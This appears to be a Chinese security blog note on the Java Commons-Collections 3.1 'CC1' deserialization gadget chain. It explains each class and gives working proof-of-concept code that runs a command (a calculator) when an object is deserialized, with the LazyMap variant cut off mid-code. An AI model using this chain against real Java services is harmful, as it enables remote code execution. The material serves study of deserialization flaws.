@@ -1,0 +1,543 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/bg/6.png">
+  <link rel="icon" href="/img/bg/6.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="海马少年">
+  <meta name="keywords" content="">
+  <meta name="description" content="CC1环境配置ubuntu + java7 + IDEA 代码测试利用 maven 构造环境，以下代码是参考 P神代码审计中的样例，先测试以下效果 1234567&lt;dependencies&gt;    &lt;dependency&gt;        &lt;groupId&gt;commons-collections&lt;&#x2F;groupId&gt;        &lt;artifac">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java CC链1">
+<meta property="og:url" content="http://example.com/2021/11/07/Java-CC/index.html">
+<meta property="og:site_name" content="Lcdm123">
+<meta property="og:description" content="CC1环境配置ubuntu + java7 + IDEA 代码测试利用 maven 构造环境，以下代码是参考 P神代码审计中的样例，先测试以下效果 1234567&lt;dependencies&gt;    &lt;dependency&gt;        &lt;groupId&gt;commons-collections&lt;&#x2F;groupId&gt;        &lt;artifac">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211105164317083.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211105191330954.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211105190935528.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211105203849930.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211105210022366.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211105210904067.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211105212302747.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211105214619152.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211105214940329.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211105220944207.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211105231814199.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211105222243124.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211105230953256.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211106002037911.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211107022124421.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211107142042883.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211107150456447.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211107154521318.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211107155236632.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211107163204792.png">
+<meta property="article:published_time" content="2021-11-07T13:34:32.000Z">
+<meta property="article:modified_time" content="2021-11-07T13:36:14.625Z">
+<meta property="article:author" content="海马少年">
+<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="Java">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211105164317083.png">
+  
+  <title>Java CC链1 - Lcdm123</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.12","typing":{"enable":true,"typeSpeed":70,"cursorChar":"*","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname"}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="Lcdm123" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>海马少年</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/bg/6.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Java CC链1">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-11-07 21:34" pubdate>
+        2021年11月7日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      7.8k 字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      24 分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Java CC链1</h1>
+            
+            <div class="markdown-body">
+              <h1 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h1><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>ubuntu + java7 + IDEA</p>
+<h2 id="代码测试"><a href="#代码测试" class="headerlink" title="代码测试"></a>代码测试</h2><p>利用 maven 构造环境，以下代码是参考 P神代码审计中的样例，先测试以下效果</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.lcdm123;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC1</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.getRuntime()),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<br>                <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;gnome-calculator&quot;</span>&#125;),<br>        &#125;;<br>        Transformer transformerChain = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        Map innerMap = <span class="hljs-keyword">new</span> HashMap();<br>        Map outerMap = TransformedMap.decorate(innerMap, <span class="hljs-keyword">null</span>, transformerChain);<br>        outerMap.put(<span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-string">&quot;xxxx&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>执行后成功打开计算器</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211105164317083.png" srcset="/img/loading.gif" lazyload alt="image-20211105164317083"></p>
+<h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><h3 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h3><p>一个接口，定义了一个<code>transform()</code>方法</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211105191330954.png" srcset="/img/loading.gif" lazyload alt="image-20211105191330954"></p>
+<p><code>ConstantTransformer</code> <code>InvokerTransformer</code> <code>ChainedTransformer</code> 都实现了这个接口</p>
+<h3 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h3><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211105190935528.png" srcset="/img/loading.gif" lazyload alt="image-20211105190935528"></p>
+<p>测试一下这个类的作用</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211105203849930.png" srcset="/img/loading.gif" lazyload alt="image-20211105203849930"></p>
+<p>传入的参数是一个 <code>Map</code>对象和两个实现了<code>Transformer</code>接口类的对象，返回值是一个<code>Map</code>类型的对象。它的作用就是来修饰 <code>Map</code>的，当被修饰的<code>Map</code>被添加新元素时将可以执行一个回调。上面的代码就是对<code>hashmap</code> 进行修饰，返回的<code>map</code>就是修饰后的<code>Map</code>，其中 <code>KeyTransformer</code> 是处理新元素的<code>key</code>的回调,<code>valueTransformer</code>是处理新元素的<code>value</code>的回调。        </p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211105210022366.png" srcset="/img/loading.gif" lazyload alt="image-20211105210022366"></p>
+<h3 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h3><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211105210904067.png" srcset="/img/loading.gif" lazyload alt="image-20211105210904067"></p>
+<p>这个类的代码很少，该类的<code>transform()</code> 方法就是返回构造时的参数。        </p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211105212302747.png" srcset="/img/loading.gif" lazyload alt="image-20211105212302747"></p>
+<p>它的作用就是包装任意一个对象，在执行回调时返回这个对象，进而方便后续操作</p>
+<h3 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h3><p>这个类可以用来执行任意方法，也是反序列化能执行任意代码的关键</p>
+<p>构造函数，公有的构造啊函数需要三个参数第一是待执行的方法名，第二个参数是函数的参数列表的参数类型，第三个参数就是传递给函数的参数列表。</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211105214619152.png" srcset="/img/loading.gif" lazyload alt="image-20211105214619152"></p>
+<p>利用反射调用函数</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211105214940329.png" srcset="/img/loading.gif" lazyload alt="image-20211105214940329"></p>
+<p>测试类</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211105220944207.png" srcset="/img/loading.gif" lazyload alt="image-20211105220944207"></p>
+<h3 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h3><p>根据名字来看就是将多个<code>Transformer</code>依次调用各自的<code>transform</code>连接起来</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211105231814199.png" srcset="/img/loading.gif" lazyload alt="image-20211105231814199"></p>
+<p>构造函数，需要传入一个<code>Transformer</code>类的数组对象</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211105222243124.png" srcset="/img/loading.gif" lazyload alt="image-20211105222243124"></p>
+<p>测试代码</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211105230953256.png" srcset="/img/loading.gif" lazyload alt="image-20211105230953256"></p>
+<h2 id="TransformedMap-POC"><a href="#TransformedMap-POC" class="headerlink" title="TransformedMap POC"></a>TransformedMap POC</h2><p>反序列化时如果需要执行命令，必须调用到<code>put()</code>函数，并且必须在<code>readObject()</code>中调用</p>
+<p>主要利用得类是<code>AnnotationInvocationHandler</code>，它是在 <code>sun.reflect.annotation.AnnotationInvocationHandler</code>位置。按照之前的分析，如果要构造利用反序列化链就必须在有重写<code>readObject()</code>并且里面有对<code>Map</code>对象的增加操作</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211106002037911.png" srcset="/img/loading.gif" lazyload alt="image-20211106002037911"></p>
+<p>在重写的<code>readObject()</code>中最后一行中的<code>setValue()</code>就刚好可以触发整个链子，所以这样就构成了漏洞。</p>
+<blockquote>
+<p>注意里面的if判断语句</p>
+</blockquote>
+<p>POC</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.lcdm123;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC1</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, ClassNotFoundException, IOException, InvocationTargetException </span>&#123;<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,<br>                        <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;,<br>                        <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,<br>                        <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;,<br>                        <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<br>                        <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<br>                        <span class="hljs-keyword">new</span> String[]&#123;<span class="hljs-string">&quot;gnome-calculator&quot;</span>&#125;)<br>        &#125;;<br>        Map inermap = <span class="hljs-keyword">new</span> HashMap();<br>        inermap.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;lcdm123&quot;</span>);<br>        Transformer transformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        Map outermap = TransformedMap.decorate(inermap, <span class="hljs-keyword">null</span>,transformer);<br><br>        Class clazz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);<br>        construct.setAccessible(<span class="hljs-keyword">true</span>);<br>        Object obj = construct.newInstance(Retention.class, outermap);<br><br>        ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(byteArrayOutputStream);<br>        objectOutputStream.writeObject(obj);<br>        objectOutputStream.close();<br><br>        System.out.println(byteArrayOutputStream);<br>        ObjectInputStream objectInputStream = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(byteArrayOutputStream.toByteArray()));<br>        Object o = (Object) objectInputStream.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>执行效果如下</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211107022124421.png" srcset="/img/loading.gif" lazyload alt="image-20211107022124421"></p>
+<p>这个 POC 中需要注意的点</p>
+<ol>
+<li><code>Runtime</code>类是不能反序列化的，因为它没有扩展反序列化接口，所以需要使用反射来调用执行</li>
+<li>需要注意构造 payload 时还需要注意 <code>inermap.put(&quot;value&quot;, &quot;lcdm123&quot;)</code></li>
+<li>这个只对java的低版本（Java 8u71以前）适用，因为高版本对这个类的<code>readObject()</code>方法做了修改</li>
+</ol>
+<blockquote>
+<p>具体的下面P神代码审计中都讲到了原因，所以就不重复记录浪费时间了</p>
+</blockquote>
+<p>但是在 ysoserial 中的链不是利用的 TransformedMap ，而是利用的 LazyMap，这是为什么呢？</p>
+<h2 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h2><p>LazyMap 和 TransformedMap 类似，都来自于 Common-Collections 库，并且继承了 AbstractMapDecorator。</p>
+<p>LazyMap 和 TransformedMap 的唯一差别就是，TransformedMap 是写入元素时执行 transform 而 LazyMap 是在使用 get 方法中执行 factory.transform。LazyMap 的作用就是懒加载，在 get 不到值的时候，它会调用 factory.transform 方法去获取一个值</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211107142042883.png" srcset="/img/loading.gif" lazyload alt="image-20211107142042883"></p>
+<p>同样是利用到了AnnotationInvocationHandler类，但是它的 readObject() 方法中没有利用到 get 方法，但是在它的 invoke 方法中调用了 get，所以在 ysoserial 中利用了对象代理的方法调用到 invoke。</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211107150456447.png" srcset="/img/loading.gif" lazyload alt="image-20211107150456447"></p>
+<p>动态代理之前的学习笔记：<a target="_blank" rel="noopener" href="http://lcdm123.xyz/2021/10/19/Java%E4%BB%A3%E7%90%86/">http://lcdm123.xyz/2021/10/19/Java%E4%BB%A3%E7%90%86/</a></p>
+<p>这里先写了一个 Map 的代理类，这个代理类实现的 invoke 方法中检测到如果调用 get 方法就会执行自定义的内容。</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211107154521318.png" srcset="/img/loading.gif" lazyload alt="image-20211107154521318"></p>
+<p>通过这样的方法就可以调用到 invoke 方法中的get()方法。</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211107155236632.png" srcset="/img/loading.gif" lazyload alt="image-20211107155236632"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.lcdm123;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC1LazyMap</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException </span>&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,<br>                        <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;,<br>                        <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,<br>                        <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;,<br>                        <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<br>                        <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<br>                        <span class="hljs-keyword">new</span> String[]&#123;<span class="hljs-string">&quot;gnome-calculator&quot;</span>&#125;)<br>        &#125;;<br><br>        Map inermap = <span class="hljs-keyword">new</span> HashMap();<br>        Transformer transformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        Map outermap = LazyMap.decorate(inermap, transformer);<br><br>        Class clazz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor cons = clazz.getDeclaredConstructor(Class.class, Map.class);<br>        cons.setAccessible(<span class="hljs-keyword">true</span>);<br>        InvocationHandler handler = (InvocationHandler) cons.newInstance(Retention.class, outermap);<br><br>        Map proxymap = 